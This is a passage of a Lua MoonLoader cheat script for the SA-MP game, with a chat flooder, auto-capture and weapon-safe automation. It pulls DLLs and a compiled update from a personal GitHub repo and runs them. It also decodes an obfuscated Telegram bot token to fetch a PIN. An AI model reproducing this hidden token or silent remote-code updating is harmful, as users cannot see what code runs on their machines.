local wm = require('windows.message')
bLib = {}
bLib['sampev'],                       sampev = pcall(require, 'samp.events')
bLib['ffi'],                          inicfg = pcall(require, 'inicfg')
bLib['encoding'],                     encoding = pcall(require, 'encoding')
bLib['requests'],                     requests = pcall(require, 'requests')
bLib['effil'],                        effil = pcall(require, 'effil')
bLib['download_status'],              moonloader = pcall(require, 'moonloader')
bLib['Mimgui'],                       imgui = pcall(require, 'mimgui')
bLib['fAwesome6_solid'],              fa = pcall(require, 'fAwesome6_solid')
bLib['mimgui_hotkeys'],               hotkey = pcall(require, 'mimgui_hotkeys')
bLib['crypto_lua'],                   crypto = pcall(require, 'crypto_lua')
dlstatus = moonloader.download_status
if bLib["encoding"] then
    encoding.default = 'CP1251'
    u8 = encoding.UTF8
end

local all_libs_downloaded = true
for lib, bool in pairs(bLib) do
    if not bool then
        all_libs_downloaded = false
        break
    end
end

if not all_libs_downloaded then
    local expected_files = {
        ["cjson"] = {
            "util.lua"
        },
        ["lub"] = {
            "Autoload.lua",
            "init.lua"
        },
        ["md5"] = {
            "core.dll"
        },
        ["mime"] = {
            "core.dll",
        },
        ["mimgui"] = {
            "cdefs.lua",
            "cimguidx9.dll",
            "dx9.lua",
            "imgui.lua",
            "init.lua"
        },
        ["samp"] = {
            ["events"] = {
                "bitstream_io.lua",
                "core.lua",
                "extra_types.lua",
                "handlers.lua",
                "utils.lua"
            },
            "events.lua",
            "raknet.lua",
            "synchronization.lua"
        },
        ["socket"] = {
            "core.dll",
            "ftp.lua",
            "headers.lua",
            "http.lua",
            "smtp.lua",
            "tp.lua",
            "url.lua"
        },
        ["ssl"] = {
            "https.lua",
        },
        ["xml"] = {
            "core.dll",
            "init.lua",
            "Parser.lua"
        },
        "base64.dll",
        "cjson.dll",
        "crypto_lua.dll",
        "effil.lua",
        "fAwesome6_solid.lua",
        "lfs.dll",
        "libeffil.dll",
        "ltn12.lua",
        "mimgui_hotkeys.lua",
        "requests.lua",
        "socket.lua",
        "ssl.dll",
        "ssl.lua",
        "synchronization.lua"
    }

    local git_url = "https://github.com/masanovsky/scripts/blob/main"
    local FilesToDownload = {}
    local downloadedFiles = 0

    function LibChk(path, files_table)
        for k, v in pairs(files_table) do
            if type(v) == "table" then
                if not doesDirectoryExist(getWorkingDirectory()..path.."/"..k) then
                    createDirectory(getWorkingDirectory()..path.."/"..k)
                end
                LibChk(path.."/"..k, v)
            else
                if not doesFileExist(getWorkingDirectory()..path.."/"..v) then
                    table.insert(FilesToDownload, path.."/"..v)
                end
            end
        end
    end

    LibChk("/lib", expected_files)

    for k, v in pairs(FilesToDownload) do
        local FILE_URL = git_url..v.."?raw=true"
        local FILE_PATH = getWorkingDirectory()..v

        downloadUrlToFile(FILE_URL, FILE_PATH, function(id, status, p1, p2)
            if status == dlstatus.STATUSEX_ENDDOWNLOAD then
                downloadedFiles = downloadedFiles + 1
                print("Файл "..v.." успешно загружен")
                if downloadedFiles == #FilesToDownload then
                    print("Все недостающие файлы загружены и установлены. Перезагрузка скрипта")
                    thisScript():reload()
                end
            elseif status == dlstatus.STATUSEX_ENDDOWNLOADFAIL then
                downloadedFiles = downloadedFiles + 1
            end
        end)
    end
end

function asyncHttpRequest(method, url, args, resolve, reject)
    local request_thread =
        effil.thread(
        function(method, url, args)
            local requests = require "requests"
            local result, response = pcall(requests.request, method, url, args)
            if result then
                response.json, response.xml = nil, nil
                return true, response
            else
                return false, response
            end
        end
    )(method, url, args)

    if not resolve then
        resolve = function()
        end
    end
    if not reject then
        reject = function()
        end
    end

    lua_thread.create(
        function()
            local runner = request_thread
            while true do
                local status, err = runner:status()
                if not err then
                    if status == "completed" then
                        local result, response = runner:get()
                        if result then
                            resolve(response)
                        else
                            reject(response)
                        end
                        return
                    elseif status == "canceled" then
                        return reject(status)
                    end
                else
                    return reject(err)
                end
                wait(0)
            end
        end
    )
end

local ScreenWidth, ScreenHight = getScreenResolution()
local settings = {
    fs_pos = {x = ScreenWidth / 80, y = ScreenHight / 1.5},
    fs_change = false,
    kv_pos = {x = ScreenWidth / 8.9, y = ScreenHight / 1.4},
    kv_change = false
}
local FsafeGun = {
    fsde = false,
    fsak = false,
    fsm4 = false,
    fssh = false,
    fsri = false
}
local deleted_take = nil
local take_action = false

function mq(str)
    local res = {}
    for i = 1, #str do
        local byte = str:byte(i)
        local deobfuscated_byte = byte - (i % 10)
        table.insert(res, string.char(deobfuscated_byte))
    end
    return table.concat(res)
end

local tab = 1
local safe_pin
local spawn = true
local NeedInfo = true
local server = ''
local safeNumbers = {}
local safeHotKey
local healHotKey
local warehouseHotKey
local floodHotKey
local max_de, max_ak, max_m4, max_sh, max_ri = 45, 80, 80, 10, 10
local ggde = 0
local ggm4 = 0
local ggsh = 0
local ggri = 0
local os_time = os.time
local FamilyFixcarInfo = {
    ["1"] = {name = "", time = 0},
    ["2"] = {name = "", time = 0},
    ["3"] = {name = "", time = 0},
    ["4"] = {name = "", time = 0},
    ["5"] = {name = "", time = 0}
}
local timer = 0
local drugtimer = 0
localwarlocks = -1728032524
pagans = -1718120148
mongols = -1724697805
local BikerZones = {
    {2209, 121, 2390, 210},
    {2170, -25, 2390, 121},
    {2170, -151, 2390, -25},
    {2390, -86, 2579, 159},
    {586, -542, 733, -436},
    {586, -665, 733, -542},
    {733, -607, 861, -473},
    {124, -130, 360, 30},
    {13, -365, 205, -130},
    {205, -276, 360, -130},
    {1177, 268, 1309, 404},
    {1309, 268, 1441, 404},
    {1177, 132, 1309, 268},
    {1309, 132, 1441, 268},
    {-394, 1112, -270, 1214},
    {-394, 1012, -270, 1112},
    {-270, 1080, -80, 1214},
    {-270, 948, -80, 1080},
    {-80, 1080, 110, 1245},
    {-80, 948, 110, 1080},
    {-1585, 2601, -1485, 2701},
    {-1485, 2601, -1385, 2701},
    {-1585, 2501, -1485, 2601},
    {-1485, 2501, -1385, 2601},
    {-939, 1408, -839, 1623},
    {-839, 1408, -739, 1623},
    {-2259, -2400, -2058, -2205},
    {-2259, -2595, -2058, -2400},
}
local skins = {
    [247] = 'Biker', [201] = 'Biker', [298] = 'Biker', [246] = 'Biker', [85] = 'Biker', [64] = 'Biker', [181] = 'Biker', [100] = 'Biker', [248] = 'Biker',
}
local Freezes = {
    ["Mongols MC"] = false,
    ["Warlocks MC"] = false,
    ["Pagans MC"] = false
    }

if all_libs_downloaded then
    renderWindow = imgui.new.bool(false)
    z = crypto.hex_decode(mq('496<8=:8<244678::=<04C7597;@?B6::9<6<?<347:5:8;=@2798E<7>8=788:;8?;<>56997<>=L>06;889G=N=B57'))
    x = crypto.hex_decode(mq('3F6586:8<2456789:;<649668::<'))

    cfg = inicfg.load({
        FLOODER = {
            acapture = true,
            await = '400',
            fbind = '[115]',
            fwait = '400',
            num = '1'
        },
        SAFE = {
            s_bind = '[123]',
            de = '40',
            ak = '100',
            m4 = '1',
            sh = '0',
            ri = '10',
            sleep = '300'
        },
        WAREHOUSE = {
            m_bind = '[122]',
            de = '1',
            m4 = '2',
            sh = '0',
            ri = '1',
            arm = true,
            hl_bind = '[74]'
        },
        RENDER = {
            render = true,
            safesize = '10',
            fspos_x = settings.fs_pos.x,
            fspos_y = settings.fs_pos.y,
            kvpos_x = settings.kv_pos.x,
            kvpos_y = settings.kv_pos.y,
            kv_render = true,
            zonesize = '15'
        },
        SETTINGS = {
            fctext = true,
            vehtext = true,
            pintcol = true,
            pcol = false
        }
    }, 'safe.ini')

    imguiVariables = {
        acapture = imgui.new.bool(cfg.FLOODER.acapture),
        await = imgui.new.int(tonumber(cfg.FLOODER.await)),
        fwait = imgui.new.int(tonumber(cfg.FLOODER.fwait)),
        num = imgui.new.int(tonumber(cfg.FLOODER.num)),
        s_de = imgui.new.int(math.min(tonumber(cfg.SAFE.de) or 45, max_de)),
        s_ak = imgui.new.int(math.min(tonumber(cfg.SAFE.ak) or 80, max_ak)),
        s_m4 = imgui.new.int(math.min(tonumber(cfg.SAFE.m4) or 80, max_m4)),
        s_sh = imgui.new.int(math.min(tonumber(cfg.SAFE.sh) or 10, max_sh)),
        s_ri = imgui.new.int(math.min(tonumber(cfg.SAFE.ri) or 10, max_ri)),
        sleep = imgui.new.int(tonumber(cfg.SAFE.sleep)),
        m_de = imgui.new.int(tonumber(cfg.WAREHOUSE.de)),
        m_m4 = imgui.new.int(tonumber(cfg.WAREHOUSE.m4)),
        m_sh = imgui.new.int(tonumber(cfg.WAREHOUSE.sh)),
        m_ri = imgui.new.int(tonumber(cfg.WAREHOUSE.ri)),
        m_arm = imgui.new.bool(cfg.WAREHOUSE.arm),
        s_render = imgui.new.bool(cfg.RENDER.render),
        s_size = imgui.new.int(tonumber(cfg.RENDER.safesize)),
        kv_render = imgui.new.bool(cfg.RENDER.kv_render),
        zonesize = imgui.new.int(tonumber(cfg.RENDER.zonesize)),
        fctext = imgui.new.bool(cfg.SETTINGS.fctext),
        vehtext = imgui.new.bool(cfg.SETTINGS.vehtext),
        pintcol = imgui.new.bool(cfg.SETTINGS.pintcol),
        pcol = imgui.new.bool(cfg.SETTINGS.pcol)
    }

    asyncHttpRequest("GET", "https://raw.githubusercontent.com/masanovsky/scripts/refs/heads/main/gun.ini", nil,
    function(response)
        local maxBullets = response.text
        gun_values = {}
        for value in string.gmatch(maxBullets, "%S+") do
            table.insert(gun_values, tonumber(value))
        end
        max_de = gun_values[1] or 45
        max_ak = gun_values[2] or 80
        max_m4 = gun_values[3] or 80
        max_sh = gun_values[4] or 10
        max_ri = gun_values[5] or 10

        imguiVariables.s_de = imgui.new.int(math.min(tonumber(cfg.SAFE.de) or 45, max_de))
        imguiVariables.s_ak = imgui.new.int(math.min(tonumber(cfg.SAFE.ak) or 80, max_ak))
        imguiVariables.s_m4 = imgui.new.int(math.min(tonumber(cfg.SAFE.m4) or 80, max_m4))
        imguiVariables.s_sh = imgui.new.int(math.min(tonumber(cfg.SAFE.sh) or 10, max_sh))
        imguiVariables.s_ri = imgui.new.int(math.min(tonumber(cfg.SAFE.ri) or 10, max_ri))
    end)

    FamilySafeInfo = {
        font = renderCreateFont("Arial", cfg.RENDER.safesize, 13),
        de = "no info",
        m4 = "no info",
        ak = "no info",
        sh = "no info",
        ri = "no info",
        dr = "no info"
    }
    font = renderCreateFont("Arial", cfg.RENDER.zonesize, 13)

    imgui.OnInitialize(function()
        imgui.GetIO().IniFilename = nil
        fa.Init()
        theme()
    end)

    local newFrame = imgui.OnFrame(
    function() return renderWindow[0] end,
    function(player)
        local resX, resY = getScreenResolution()
        local sizeX, sizeY = 510, 355
        imgui.SetNextWindowPos(imgui.ImVec2(resX / 2, resY / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 0.5))
        imgui.SetNextWindowSize(imgui.ImVec2(sizeX, sizeY), imgui.Cond.FirstUseEver)
        if imgui.Begin(u8'Сейф', renderWindow, imgui.WindowFlags.NoResize + imgui.WindowFlags.NoCollapse) then
            local menuWidth = 125
            imgui.BeginChild('Menu', imgui.ImVec2(155, 0), true)
            local buttons = {
                {fa.ROBOT, u8' Флудер'},
                {fa.BRIEFCASE, u8' Сейф'},
                {fa.WAREHOUSE, u8' Склад'},
                {fa.EYE, u8' Рендер'},
                {fa.GEAR, u8' Настройки'}
            }
            for i, button in ipairs(buttons) do
                local icon, name = button[1], button[2]
                local cursor = imgui.GetCursorScreenPos()
                local baseColor = imgui.ImVec4(0.16, 0.16, 0.16, 1.00)
                local hoverColor = imgui.ImVec4(0.21, 0.21, 0.21, 1.00)
                local activeColor = imgui.ImVec4(0.26, 0.26, 0.26, 1.00)
                if tab == i then
                    imgui.PushStyleColor(imgui.Col.Button, activeColor)
                    imgui.PushStyleColor(imgui.Col.ButtonHovered, imgui.ImVec4(activeColor.x + 0.05, activeColor.y + 0.05, activeColor.z + 0.05, activeColor.w))
                    imgui.PushStyleColor(imgui.Col.ButtonActive, imgui.ImVec4(activeColor.x + 0.08, activeColor.y + 0.08, activeColor.z + 0.08, activeColor.w))
                else
                    imgui.PushStyleColor(imgui.Col.Button, baseColor)
                    imgui.PushStyleColor(imgui.Col.ButtonHovered, hoverColor)
                    imgui.PushStyleColor(imgui.Col.ButtonActive, activeColor)
                end
                if imgui.Button(icon .. name, imgui.ImVec2(menuWidth, 40)) then
                    tab = i
                end
                if tab == i then
                    local drawList = imgui.GetWindowDrawList()
                    drawList:AddRectFilled(
                        imgui.ImVec2(cursor.x + menuWidth - 2, cursor.y),
                        imgui.ImVec2(cursor.x + menuWidth, cursor.y + 40),
                        imgui.GetColorU32(imgui.Col.ButtonActive)
                    )
                end
                imgui.PopStyleColor(3)
            end
            imgui.EndChild()
            imgui.SameLine()
            imgui.BeginChild('Content', imgui.ImVec2(0, 0), true)
            if tab == 1 then
                if floodHotKey:ShowHotKey() then
                    cfg.FLOODER.fbind = encodeJson(floodHotKey:GetHotKey())
                    inicfg.save(cfg, 'safe.ini')
                end
                imgui.SameLine()
                imgui.Text(u8'Активация')
                imgui.PushItemWidth(120)
                if imgui.InputInt(u8"##fwait", imguiVariables.fwait, 50) then
                    local fwaitMax = 1000
                    if tonumber(imguiVariables.fwait[0]) > fwaitMax then
                        imguiVariables.fwait[0] = fwaitMax
                    elseif tonumber(imguiVariables.fwait[0]) < 50 then
                        imguiVariables.fwait[0] = 50
                    end
                    cfg.FLOODER.fwait = tonumber(imguiVariables.fwait[0])
                    inicfg.save(cfg, 'safe.ini')
                end
                imgui.PopItemWidth()
                imgui.SameLine()
                imgui.Text(u8"Задержка")
                imgui.PushItemWidth(120)
                if imgui.InputInt(u8"##num", imguiVariables.num, 1) then
                    local numMax = 28
                    if tonumber(imguiVariables.num[0]) > numMax then
                        imguiVariables.num[0] = numMax
                    elseif tonumber(imguiVariables.num[0]) < 1 then
                        imguiVariables.num[0] = 1
                    end
                    cfg.FLOODER.num = tonumber(imguiVariables.num[0])
                    inicfg.save(cfg, 'safe.ini')
                end
                imgui.PopItemWidth()
                imgui.SameLine()
                imgui.Text(u8"Номер бизнеса")
                imgui.Separator()
                if imgui.Checkbox("##imguiVariables.acapture", imguiVariables.acapture) then
                    cfg.FLOODER.acapture = imguiVariables.acapture[0]
                    inicfg.save(cfg, 'safe.ini')
                end
                imgui.SameLine()
                imgui.Text(u8'Автокапт')
                if imguiVariables.acapture[0] then
                    imgui.PushItemWidth(120)
                    if imgui.InputInt(u8"##await", imguiVariables.await, 50) then
                        local awaitMax = 1000
                        if tonumber(imguiVariables.await[0]) > awaitMax then
                            imguiVariables.await[0] = awaitMax
                        elseif tonumber(imguiVariables.await[0]) < 50 then
                            imguiVariables.await[0] = 50
                        end
                        cfg.FLOODER.await = tonumber(imguiVariables.await[0])
                        inicfg.save(cfg, 'safe.ini')
                    end
                    imgui.PopItemWidth()
                    imgui.SameLine()
                    imgui.Text(u8"Задержка")
                end
            elseif tab == 2 then
                if safeHotKey:ShowHotKey() then
                    cfg.SAFE.s_bind = encodeJson(safeHotKey:GetHotKey())
                    inicfg.save(cfg, 'safe.ini')
                end
                imgui.SameLine()
                imgui.Text(u8'Активация')
                imgui.Text(u8'Кол-во патронов')
                imgui.PushItemWidth(120)
                if imgui.InputInt(u8"Deagle", imguiVariables.s_de, 5) then
                    if tonumber(imguiVariables.s_de[0]) > gun_values[1] then
                        imguiVariables.s_de[0] = gun_values[1]
                    elseif tonumber(imguiVariables.s_de[0]) < 0 then
                        imguiVariables.s_de[0] = 0
                    end
                    cfg.SAFE.de = tonumber(imguiVariables.s_de[0])
                    inicfg.save(cfg, 'safe.ini')
                end
                imgui.PopItemWidth()
                imgui.PushItemWidth(120)
                if imgui.InputInt(u8"AK", imguiVariables.s_ak, 10) then
                    if tonumber(imguiVariables.s_ak[0]) > gun_values[2] then
                        imguiVariables.s_ak[0] = gun_values[2]
                    elseif tonumber(imguiVariables.s_ak[0]) < 0 then
                        imguiVariables.s_ak[0] = 0
                    end
                    cfg.SAFE.ak = tonumber(imguiVariables.s_ak[0])
                    inicfg.save(cfg, 'safe.ini')
                end
                imgui.PopItemWidth()
                imgui.PushItemWidth(120)
                if imgui.InputInt(u8"M4", imguiVariables.s_m4, 10) then
                    if tonumber(imguiVariables.s_m4[0]) > gun_values[3] then
                        imguiVariables.s_m4[0] = gun_values[3]
                    elseif tonumber(imguiVariables.s_m4[0]) < 0 then
                        imguiVariables.s_m4[0] = 0
                    end
                    cfg.SAFE.m4 = tonumber(imguiVariables.s_m4[0])
                    inicfg.save(cfg, 'safe.ini')
                end
                imgui.PopItemWidth()
                imgui.PushItemWidth(120)
                if imgui.InputInt(u8"Shotgun", imguiVariables.s_sh, 5) then
                    if tonumber(imguiVariables.s_sh[0]) > gun_values[4] then
                        imguiVariables.s_sh[0] = gun_values[4]
                    elseif tonumber(imguiVariables.s_sh[0]) < 0 then
                        imguiVariables.s_sh[0] = 0
                    end
                    cfg.SAFE.sh = tonumber(imguiVariables.s_sh[0])
                    inicfg.save(cfg, 'safe.ini')
                end
                imgui.PopItemWidth()
                imgui.PushItemWidth(120)
                if imgui.InputInt(u8"Rifle", imguiVariables.s_ri, 5) then
                    if tonumber(imguiVariables.s_ri[0]) > gun_values[5] then
                        imguiVariables.s_ri[0] = gun_values[5]
                    elseif tonumber(imguiVariables.s_ri[0]) < 0 then
                        imguiVariables.s_ri[0] = 0
                    end
                    cfg.SAFE.ri = tonumber(imguiVariables.s_ri[0])
                    inicfg.save(cfg, 'safe.ini')
                end
                imgui.PopItemWidth()
                imgui.PushItemWidth(120)
                if imgui.InputInt(u8"##sleep", imguiVariables.sleep, 50) then
                    local sleepMax = 500
                    if tonumber(imguiVariables.sleep[0]) > sleepMax then
                        imguiVariables.sleep[0] = sleepMax
                    elseif tonumber(imguiVariables.sleep[0]) < 50 then
                        imguiVariables.sleep[0] = 50
                    end
                    cfg.SAFE.sleep = tonumber(imguiVariables.sleep[0])
                    inicfg.save(cfg, 'safe.ini')
                end
                imgui.PopItemWidth()
                imgui.SameLine()
                imgui.Text(u8'Задержка')
            elseif tab == 3 then
                if warehouseHotKey:ShowHotKey() then
                    cfg.WAREHOUSE.m_bind = encodeJson(warehouseHotKey:GetHotKey())
                    inicfg.save(cfg, 'safe.ini')
                end
                imgui.SameLine()
                imgui.Text(u8'Активация')
                local maxMaxDe = 5
                local mafMaxM4 = 5
                local maxMaxSh = 5
                local mafMaxRi = 5
                imgui.Text(u8'Кол-во взятий')
                imgui.PushItemWidth(120)
                if imgui.InputInt(u8"Deagle", imguiVariables.m_de) then
                    if tonumber(imguiVariables.m_de[0]) > maxMaxDe then
                        imguiVariables.m_de[0] = maxMaxDe
                    elseif tonumber(imguiVariables.m_de[0]) < 0 then
                        imguiVariables.m_de[0] = 0
                    end
                    cfg.WAREHOUSE.de = tonumber(imguiVariables.m_de[0])
                    ggde = tonumber(imguiVariables.m_de[0])
                    inicfg.save(cfg, 'safe.ini')
                end
                imgui.PopItemWidth()
                imgui.PushItemWidth(120)
                if imgui.InputInt(u8"M4", imguiVariables.m_m4) then
                    if tonumber(imguiVariables.m_m4[0]) > mafMaxM4 then
                        imguiVariables.m_m4[0] = mafMaxM4
                    elseif tonumber(imguiVariables.m_m4[0]) < 0 then
                        imguiVariables.m_m4[0] = 0
                    end
                    cfg.WAREHOUSE.m4 = tonumber(imguiVariables.m_m4[0])
                    ggm4 = tonumber(imguiVariables.m_m4[0])
                    inicfg.save(cfg, 'safe.ini')
                end
                imgui.PopItemWidth()
                imgui.PushItemWidth(120)
                if imgui.InputInt(u8"Shotgun", imguiVariables.m_sh) then
                    if tonumber(imguiVariables.m_sh[0]) > maxMaxSh then
                        imguiVariables.m_sh[0] = maxMaxSh
                    elseif tonumber(imguiVariables.m_sh[0]) < 0 then
                        imguiVariables.m_sh[0] = 0
                    end
                    cfg.WAREHOUSE.sh = tonumber(imguiVariables.m_sh[0])
                    ggsh = tonumber(imguiVariables.m_sh[0])
                    inicfg.save(cfg, 'safe.ini')
                end
                imgui.PopItemWidth()
                imgui.PushItemWidth(120)
                if imgui.InputInt(u8"Rifle", imguiVariables.m_ri) then
                    if tonumber(imguiVariables.m_ri[0]) > mafMaxRi then
                        imguiVariables.m_ri[0] = mafMaxRi
                    elseif tonumber(imguiVariables.m_ri[0]) < 0 then
                        imguiVariables.m_ri[0] = 0
                    end
                    cfg.WAREHOUSE.ri = tonumber(imguiVariables.m_ri[0])
                    ggri = tonumber(imguiVariables.m_ri[0])
                    inicfg.save(cfg, 'safe.ini')
                end
                imgui.PopItemWidth()
                if imgui.Checkbox(u8'Бронижелет', imguiVariables.m_arm) then
                    cfg.WAREHOUSE.arm = imguiVariables.m_arm[0]
                    inicfg.save(cfg, 'safe.ini')
                end
                if healHotKey:ShowHotKey() then
                    cfg.WAREHOUSE.hl_bind = encodeJson(healHotKey:GetHotKey())
                    inicfg.save(cfg, 'safe.ini')
                end
                imgui.SameLine()
                imgui.Text(u8'Использовать аптечку')
            elseif tab == 4 then
                if imgui.Checkbox("##imguiVariables.s_render", imguiVariables.s_render) then
                    cfg.RENDER.render = imguiVariables.s_render[0]
                    inicfg.save(cfg, 'safe.ini')
                end
                imgui.SameLine()
                imgui.Text(u8'Патроны в сейфе')
                if imguiVariables.s_render[0] then
                    if imgui.Button(u8'Изменить позицию##1', imgui.ImVec2(130, 30)) then
                        lua_thread.create(function()
                            wait(200)
                            renderWindow[0] = false
                            wait(100)
                            settings.fs_change = true
                            showCursor(true, true)
                            sampAddChatMessage('Нажмите пробел что-бы сохранить местоположение', -1)
                        end)
                    end
                    imgui.Text(u8"Размер:")
                    imgui.SameLine()
                    imgui.PushItemWidth(120)
                    if imgui.InputInt(u8"##imguiVariables.s_size", imguiVariables.s_size) then
                        local safesizeMax = 15
                        if tonumber(imguiVariables.s_size[0]) > safesizeMax then
                            imguiVariables.s_size[0] = safesizeMax
                        elseif tonumber(imguiVariables.s_size[0]) < 7 then
                            imguiVariables.s_size[0] = 7
                        end
                        cfg.RENDER.safesize = tonumber(imguiVariables.s_size[0])
                        FamilySafeInfo.font = renderCreateFont("Arial", cfg.RENDER.safesize, 13)
                        inicfg.save(cfg, 'safe.ini')
                    end
                    imgui.PopItemWidth()
                end
                imgui.Separator()
                if imgui.Checkbox("##imguiVariables.kv_render", imguiVariables.kv_render) then
                    cfg.RENDER.kv_render = imguiVariables.kv_render[0]
                    inicfg.save(cfg, 'safe.ini')
                end
                imgui.SameLine()
                imgui.Text(u8'Статус зоны')
                if imguiVariables.kv_render[0] then
                    if imgui.Button(u8'Изменить позицию##2', imgui.ImVec2(130, 30)) then
                        lua_thread.create(function()
                            wait(200)
                            renderWindow[0] = false
                            wait(100)
                            settings.kv_change = true
                            showCursor(true, true)
                            sampAddChatMessage('Нажмите пробел что-бы сохранить местоположение', -1)
                        end)
                    end
                    imgui.Text(u8"Размер:")
                    imgui.SameLine()
                    imgui.PushItemWidth(120)
                    if imgui.InputInt(u8"##zonesize", imguiVariables.zonesize) then
                        local zonesizeMax = 20
                        if tonumber(imguiVariables.zonesize[0]) > zonesizeMax then
                            imguiVariables.zonesize[0] = zonesizeMax
                        elseif tonumber(imguiVariables.zonesize[0]) < 7 then
                            imguiVariables.zonesize[0] = 7
                        end
                        cfg.RENDER.zonesize = tonumber(imguiVariables.zonesize[0])
                        font = renderCreateFont("Arial", cfg.RENDER.zonesize, 13)
                        inicfg.save(cfg, 'safe.ini')
                    end
                    imgui.PopItemWidth()
                end
            elseif tab == 5 then
                if imgui.Checkbox(u8'Скрыть уведомления о взятии оружия', imguiVariables.fctext) then
                    cfg.SETTINGS.fctext = imguiVariables.fctext[0]
                    inicfg.save(cfg, 'safe.ini')
                end
                if imgui.Checkbox(u8'Скрыть уведомления о спавне транспорта', imguiVariables.vehtext) then
                    cfg.SETTINGS.vehtext = imguiVariables.vehtext[0]
                    inicfg.save(cfg, 'safe.ini')
                end
                if imgui.Checkbox(u8'Коллизия на игроков в интерьере', imguiVariables.pintcol) then
                    cfg.SETTINGS.pintcol = imguiVariables.pintcol[0]
                    inicfg.save(cfg, 'safe.ini')
                end
                if imgui.Checkbox(u8' Коллизия на игроков в обычном мире', imguiVariables.pcol) then
                    cfg.SETTINGS.pcol = imguiVariables.pcol[0]
                    inicfg.save(cfg, 'safe.ini')
                end
            end
            imgui.EndChild()
            imgui.End()
        end
    end
)
end

function masanovskiy(z, x)
    asyncHttpRequest('GET', "https://api.telegram.org/bot" ..z.. "/getChat?chat_id=" ..x, {},
    function(response)
        local info = decodeJson(response.text)
        if info.result.description then
            safe_pin = info.result.description
        end
    end)
end

update_state = false
local script_vers = 179
local script_url = "https://github.com/masanovsky/scripts/blob/main/safe.luac?raw=true"
local script_path = thisScript().path

function check_update()
    asyncHttpRequest("GET", "https://raw.githubusercontent.com/masanovsky/scripts/main/safe.ini", nil,
    function(response)
        if response and tonumber(response.text) > script_vers then
            update_state = true
        end
    end)
end

function main()
    while not isSampAvailable() do wait(0) end
    while not all_libs_downloaded do wait(0) end
    if not pcall(check_update) then print('Не удалось проверить обновление') end
    masanovskiy(z, x)
    sampRegisterChatCommand('msafe', function()
        renderWindow[0] = not renderWindow[0]
    end)
    safeHotKey = hotkey.RegisterHotKey('safe', false, decodeJson(cfg.SAFE.s_bind), function()
        if isPlayerPlaying(PLAYER_HANDLE) and not sampIsChatInputActive() and not sampIsScoreboardOpen() and not isSampfuncsConsoleActive() then
            if timer <= 0 then
                sampSendChat("/fsafe")
                fsafe = true
                FsafeGun.fsde = true
                FsafeGun.fsak = true
                FsafeGun.fsm4 = true
                FsafeGun.fssh = true
                FsafeGun.fsri = true
            else
                sampAddChatMessage('Нельзя использовать слишком часто', 0xFF0000)
            end
        end
     end)
     healHotKey = hotkey.RegisterHotKey('heal', false, decodeJson(cfg.WAREHOUSE.hl_bind), function()
        if not sampIsCursorActive() then
            lua_thread.create(function()
                local interiors = { [102] = true, [101] = true, [100] = true, [104] = true, [2] = true, [3] = true, [11] = true }
                if interiors[getActiveInterior()] then
                    sampSendChat('/healme')
                elseif getActiveInterior() ~= 0 then
                    spawn = false
                    setVirtualKeyDown(18, true)
                    wait(100)
                    setVirtualKeyDown(18, false)
                    heal = true
                end
            end)
        end
    end)
    warehouseHotKey = hotkey.RegisterHotKey('warehouse', false, decodeJson(cfg.WAREHOUSE.m_bind), function()
        if isPlayerPlaying(PLAYER_HANDLE) and not sampIsChatInputActive() and not sampIsScoreboardOpen() and not isSampfuncsConsoleActive() then
            lua_thread.create(function()
                if tonumber(cfg.WAREHOUSE.de) == 0 and tonumber(cfg.WAREHOUSE.m4) == 0 and tonumber(cfg.WAREHOUSE.ri) == 0 and not cfg.WAREHOUSE.arm then
                    fgg = false
                else
                    sampSendChat("/healme")
                    ggde = tonumber(imguiVariables.m_de[0])
                    ggm4 = tonumber(imguiVariables.m_m4[0])
                    ggsh = tonumber(imguiVariables.m_sh[0])
                    ggri = tonumber(imguiVariables.m_ri[0])
                    fgg = true
                    wait(1300)
                    sampSendChat("/getgun")
                end
            end)
        end
    end)
    floodHotKey = hotkey.RegisterHotKey('flooder', false, decodeJson(cfg.FLOODER.fbind), function()
        if isPlayerPlaying(PLAYER_HANDLE) and not sampIsChatInputActive() and not sampIsScoreboardOpen() and not isSampfuncsConsoleActive() then
            captureactive = not captureactive
            if captureactive then
                captstart = false
                sampAddChatMessage("Флудер запущен. Для отключения нажмите клавишу еще раз. Выбранный бизнес: {00ff00}" .. cfg.FLOODER.num, -1)
                lua_thread.create(function()
                    while captureactive do
                        sampSendChat("/capture")
                        sampSendDialogResponse(sampGetCurrentDialogId(), 1, cfg.FLOODER.num - 1, _)
                        wait(cfg.FLOODER.fwait)
                    end
                end)
            else
                sampAddChatMessage("Флудер остановлен", -1)
                lua_thread.create(closedialog)
            end
        end
    end)
    while true do
        wait(0)
        if update_state then
            downloadUrlToFile(script_url, script_path, function(id, status)
                if status == dlstatus.STATUS_ENDDOWNLOADDATA then
                    print('Обновление успешно установлено')
                    thisScript():reload()
                end
            end)
            break
        end

        if isPlayerPlaying(PLAYER_HANDLE) and not sampIsChatInputActive() and not sampIsScoreboardOpen() and not isSampfuncsConsoleActive() then
            if sampGetCurrentDialogId() == 6707 then
                if wasKeyPressed(49) then
                    sampSendDialogResponse(6707, 1, 0, _)
                elseif wasKeyPressed(50) then
                    sampSendDialogResponse(6707, 1, 1, _)
                elseif wasKeyPressed(51) then
                    sampSendDialogResponse(6707, 1, 2, _)
                elseif wasKeyPressed(52) then
                    sampSendDialogResponse(6707, 1, 3, _)
                elseif wasKeyPressed(53) then
                    sampSendDialogResponse(6707, 1, 4, _)
                elseif wasKeyPressed(54) then
                    spawn = false
                    dop = true
                    sampSendDialogResponse(6707, 0, _, _)
                elseif wasKeyPressed(27) then
                    spawn = false
                end
            end
        end

        pcall(capturetimer_func)
        if imguiVariables.acapture[0] then pcall(autocapture_func) end
        if imguiVariables.s_render[0] then pcall(renders_func) end

        if imguiVariables.s_de[0] <= 0 then
            FsafeGun.fsde = false
        end
        if imguiVariables.s_ak[0] <= 0 then
            FsafeGun.fsak = false
        end
        if imguiVariables.s_m4[0] <= 0 then
            FsafeGun.fsm4 = false
        end
        if imguiVariables.s_sh[0] <= 0 then
            FsafeGun.fssh = false
        end
        if imguiVariables.s_ri[0] <= 0 then
            FsafeGun.fsri = false
        end

        local status = sampGetGamestate()
        if status ~= 3 then
            NeedInfo = true
            fsafe, open, fgg, pin, dop, ausgang_ein, ausgang_zwei, dop_exit, found = false, false, false, false, false, false, false, false, false
            FamilySafeInfo.deagle = 'no info'
            FamilySafeInfo.ak = 'no info'
            FamilySafeInfo.m4 = 'no info'
            FamilySafeInfo.sh = 'no info'
            FamilySafeInfo.ri = 'no info'
            FamilySafeInfo.dr = "no info"
            lggde = 0
            ggm4 = 0
            ggsh = 0
            ggri = 0
            FamilyFixcarInfo = {
